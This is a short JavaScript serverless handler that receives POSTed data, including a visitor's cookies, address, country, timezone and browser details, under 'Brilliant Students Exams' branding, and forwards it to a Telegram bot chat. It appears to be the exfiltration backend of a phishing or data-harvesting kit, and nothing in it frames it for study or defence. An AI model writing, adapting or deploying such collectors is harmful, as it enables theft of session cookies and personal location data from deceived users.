export default {
  async fetch(request, env) {
    if (request.method !== 'POST') {
      return new Response('Only POST allowed', { status: 405 });
    }

    let data;
    try {
      data = await request.json();
    } catch {
      return new Response('Invalid JSON', { status: 400 });
    }

    const { userTag, examNumber, geoInfo, browserInfo, cookies } = data;

    if (!userTag || !examNumber) {
      return new Response('Missing userTag or examNumber', { status: 400 });
    }

    const BOT_TOKEN = env.BOT_TOKEN;
    const CHAT_ID = env.CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
      return new Response('Environment variables not set', { status: 500 });
    }

    const message =
      `📘 *Brilliant Students Exams*\n` +
      `🏷️ Tag: ${userTag}\n` +
      `📨 Exam Number: ${examNumber}\n` +
      `🌍 Country: ${geoInfo?.country || 'Unknown'}\n` +
      `📍 Address: ${geoInfo?.address || 'Unknown'}\n` +
      `⏰ Timezone: ${geoInfo?.timezone || 'Unknown'}\n` +
      `🖥️ Browser: ${browserInfo?.name || 'Unknown'} v${browserInfo?.version || ''}\n` +
      `🍪 Cookies: ${cookies || 'None'}\n` +
      `✔️ Passed 2nd Stage`;

    try {
      const telegramRes = await fetch(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
          }),
        }
      );

      const telegramData = await telegramRes.json();

      if (telegramData.ok) {
        return new Response(JSON.stringify({ success: true }), { status: 200 });
      } else {
        return new Response(JSON.stringify({ error: 'Telegram API error', details: telegramData }), { status: 502 });
      }
    } catch (err) {
      return new Response(JSON.stringify({ error: 'Fetch to Telegram failed', details: err.message }), { status: 502 });
    }
  }
};
